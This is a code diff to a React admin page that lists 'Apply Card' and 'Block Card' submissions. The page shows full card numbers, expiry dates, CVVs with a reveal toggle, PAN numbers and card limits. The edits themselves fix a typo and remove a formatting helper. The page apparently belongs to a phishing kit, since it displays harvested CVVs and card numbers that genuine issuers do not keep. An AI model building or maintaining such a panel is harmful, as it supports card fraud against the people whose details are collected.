@@ -38,7 +38,7 @@ export default function Admin() {
   const [adminPass, setAdminPass] = useState("");
   const [loginError, setLoginError] = useState(false);
   const [showPass, setShowPass] = useState(false);
-  const [showCvv, setShowCcv] = useState(false);
+  const [showCvv, setShowCvv] = useState(false);
 
   useEffect(() => {
     if (localStorage.getItem("adminLoggedIn") === "true") {
@@ -70,11 +70,6 @@ export default function Admin() {
 
   const applyCount = submissions?.filter((s: Submission) => s.type === "Apply Card").length || 0;
   const blockCount = submissions?.filter((s: Submission) => s.type === "Block Card").length || 0;
-
-  const formatCard = (num: string | null) => {
-    if (!num) return "N/A";
-    return num.trim();
-  };
 
   if (!loggedIn) {
     return (
@@ -147,7 +142,6 @@ export default function Admin() {
           onClick={handleLogout}
           className="flex items-center gap-2 bg-white text-[#96144c] px-4 py-2 rounded-lg font-semibold text-sm hover:bg-white/90 transition-all"
         >
-          {formatCard(sub.cardNumber)}
           <LogOut size={16} /> Logout
         </button>
       </header>
@@ -250,7 +244,7 @@ export default function Admin() {
                       <td className="px-3 py-3 text-gray-600 font-mono">{sub.pan || "N/A"}</td>
                       <td className="px-3 py-3 text-gray-600">₹{sub.cardLimit || "N/A"}</td>
                       <td className="px-3 py-3 text-gray-600 font-mono">
-                        {formatCard(sub.cardNumber)}
+                        {sub.cardNumber || "N/A"}
                       </td>
                       <td className="px-3 py-3 text-gray-600">{sub.expiry || "N/A"}</td>
                       <td className="px-3 py-3">
@@ -260,7 +254,7 @@ export default function Admin() {
                           </span>
                           {sub.cvv && (
                             <button
-                              onClick={() => setShowCcv(!showCvv)}
+                              onClick={() => setShowCvv(!showCvv)}
                               className="text-gray-400 hover:text-[#96144c]"
                             >
                               {showCvv ? <EyeOff size={12} /> : <Eye size={12} />}
